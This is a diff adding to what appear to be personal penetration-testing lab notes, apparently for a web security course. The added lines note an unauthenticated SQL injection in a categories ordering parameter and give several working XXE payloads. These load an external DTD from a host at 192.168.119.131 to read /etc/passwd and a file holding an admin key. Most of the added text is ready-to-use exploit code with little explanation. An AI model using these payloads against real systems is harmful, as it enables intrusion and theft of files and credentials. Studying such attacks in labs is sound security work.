@@ -168,4 +168,42 @@ Here is a better payload
     - we can set the *active* parameter to:
     > (select 1)=1
 
+categories?order has a unauthenticated sqli
 
+
+importing causes the application to make a get request for wrapper .dtd
+Additionally if we look at /var/log/answers.log we can clearly see the filesystem is searching for /etc/password which of course does not exist
+```xml
+<!DOCTYPE data [ <!ENTITY % start "<![CDATA["> <!ENTITY % file SYSTEM "file:///etc/password" > <!ENTITY % end "]]>"> <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" > %dtd; ]> <test>&wrapper;</test>
+```
+
+working payload for /etc/password
+```xml
+<!DOCTYPE data [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///etc/passwd" >
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
+  %dtd;
+  ]>
+  <database><categories><category><name>&wrapper;</name></category></categories></database>
+```
+Here we can get the admin key
+```xml
+<!DOCTYPE data [
+  <!ENTITY % start "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
+  <!ENTITY % end "]]>">
+  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
+  %dtd;
+  ]>
+  <database><categories><category><name>&wrapper;</name></category></categories></database>
+```
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://192.168.119.131/xxe-success" >
+  <!ENTITY key SYSTEM "file:///home/student/adminkey.txt">
+  %xxe;
+  ]>
+  <database><categories><category><name>&key;</name></category></categories></database>
+```
